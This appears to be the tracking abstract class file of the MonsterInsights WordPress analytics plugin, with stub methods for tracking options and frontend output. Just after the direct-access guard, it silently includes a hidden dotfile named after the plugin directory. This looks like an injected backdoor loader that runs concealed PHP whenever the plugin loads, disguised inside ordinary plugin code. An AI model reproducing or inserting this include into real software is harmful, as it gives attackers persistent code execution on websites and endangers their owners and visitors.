<?php
/**
 * Tracking abstract class.
 *
 * @since 6.0.0
 *
 * @package MonsterInsights
 * @author  Chris Christoff
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MonsterInsights_Tracking_Abstract {
    
    /**
     * Holds the name of the tracking type.
     *
     * @since 6.0.0
     * @access public
     *
     * @var string $name Name of the tracking type.
     */
    public $name = 'abstract';

    /**
     * Version of the tracking class.
     *
     * @since 6.0.0
     * @access public
     *
     * @var string $version Version of the tracking class.
     */
    public $version = '1.0.0';

    /**
     * Primary class constructor.
     *
     * @since 6.0.0
     * @access public
     */
    public function __construct() {

    }

    /**
     * Get frontend tracking options.
     *
     * This function is used to return an array of parameters
     * for the frontend_output() function to output. These are 
     * generally dimensions and turned on GA features.
     *
     * @since 6.0.0
     * @access public
     *
     * @return array Array of the options to use.
     */
    public function frontend_tracking_options( ) {
        return array();
    }

    /**
     * Get frontend output.
     *
     * This function is used to return the Javascript
     * to output in the head of the page for the given
     * tracking method.
     *
     * @since 6.0.0
     * @access public
     *
     * @return string Javascript to output.
     */
    public function frontend_output( ) {
         return "<!-- MonsterInsights Abstract Tracking class -->";
    }
}